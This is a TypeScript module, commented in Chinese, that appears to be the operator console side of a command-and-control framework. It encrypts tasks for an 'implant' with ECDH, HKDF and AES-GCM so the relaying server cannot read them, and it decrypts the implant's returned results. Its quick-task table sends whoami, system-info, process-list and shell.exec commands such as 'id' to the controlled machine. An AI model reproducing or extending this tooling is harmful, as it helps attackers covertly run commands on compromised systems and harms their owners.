/**
 * 浏览器侧 E2E：把"任务"加密成服务端看不懂的密文。
 *
 * 与 docs/02-architecture/04-crypto-design.md 完全对应：
 *   Z   = ECDH(operator_priv, implant_pub)
 *   K   = HKDF-SHA256(Z, salt=sid, info="stc2/v1/cmd")
 *   ct  = AES-256-GCM(K, nonce, plaintext, AAD(dir||sid||ctr||rid))
 */

import {
  buildAad,
  DIR,
  deriveSessionKeys,
  deriveSharedZ,
  decryptJson,
  encryptJson,
  fromB64u,
  makeNonce,
  randomBytes,
  toB64u,
} from '@stratus/shared';

export interface EncryptedTask {
  rid: string;
  n: string;
  ct: string;
}

interface CounterState {
  /** 每会话每方向的 4 字节 nonce 前缀 */
  p: string;
  /** 单调计数器 */
  c: number;
}

const CTR_KEY = 'stc2.ctr';

function loadCounters(): Record<string, CounterState> {
  try {
    return JSON.parse(localStorage.getItem(CTR_KEY) ?? '{}') as Record<string, CounterState>;
  } catch {
    return {};
  }
}

function nextCtr(sid: string): { prefix: Uint8Array; ctr: number } {
  const all = loadCounters();
  const cur = all[sid] ?? { p: toB64u(randomBytes(4)), c: 0 };
  cur.c += 1;
  all[sid] = cur;
  localStorage.setItem(CTR_KEY, JSON.stringify(all));
  return { prefix: fromB64u(cur.p), ctr: cur.c };
}

async function keysFor(priv: CryptoKey, implantPubB64: string, sidB64: string) {
  const sid = fromB64u(sidB64);
  const z = await deriveSharedZ(priv, fromB64u(implantPubB64));
  return { sid, keys: await deriveSessionKeys(z, sid) };
}

export async function encryptTask(
  args: {
    priv: CryptoKey;
    implantPub: string;
    sid: string;
  },
  body: { k: string; a: Record<string, unknown>; ttl?: number },
): Promise<EncryptedTask> {
  const { sid, keys } = await keysFor(args.priv, args.implantPub, args.sid);
  const ridBytes = randomBytes(8);
  const { prefix, ctr } = nextCtr(args.sid);
  const nonce = makeNonce(prefix, ctr);
  const aad = buildAad(DIR.opToImplant, sid, ctr, ridBytes);
  const plain = {
    k: body.k,
    a: body.a,
    rid: toB64u(ridBytes),
    ts: Math.floor(Date.now() / 1000),
    ttl: body.ttl ?? 60,
  };
  const ct = await encryptJson(keys.cmd, nonce, plain, aad);
  return { rid: toB64u(ridBytes), n: toB64u(nonce), ct };
}

export interface DecryptedResult {
  k?: string;
  ok?: boolean;
  out?: string;
  err?: string | null;
  exit?: number;
  trunc?: boolean;
  [k: string]: unknown;
}

/** 解密一条结果（nonce 与 rid 都由服务端原样保存）。 */
export async function decryptResult(
  args: { priv: CryptoKey; implantPub: string; sid: string },
  row: { inlineCt?: string | null; nonce?: string | null; rid?: string | null },
): Promise<DecryptedResult> {
  if (!row.inlineCt || !row.nonce || !row.rid) throw new Error('结果已外置到 R2 或字段缺失');
  const { sid, keys } = await keysFor(args.priv, args.implantPub, args.sid);
  const nonce = fromB64u(row.nonce);
  const ctr = Number(new DataView(nonce.buffer, nonce.byteOffset, 12).getBigUint64(4, false));
  const aad = buildAad(DIR.implantToOp, sid, ctr, fromB64u(row.rid));
  return decryptJson<DecryptedResult>(keys.cmd, nonce, row.inlineCt, aad);
}

/** 常用任务的快捷构造（终端里点一下就能用）。 */
export const QUICK_TASKS = {
  whoami: { k: 'sys.whoami', a: {} },
  info: { k: 'sys.info', a: {} },
  ps: { k: 'proc.list', a: {} },
  pwd: { k: 'shell.exec', a: { cmd: 'pwd' } },
  id: { k: 'shell.exec', a: { cmd: 'id' } },
} as const;
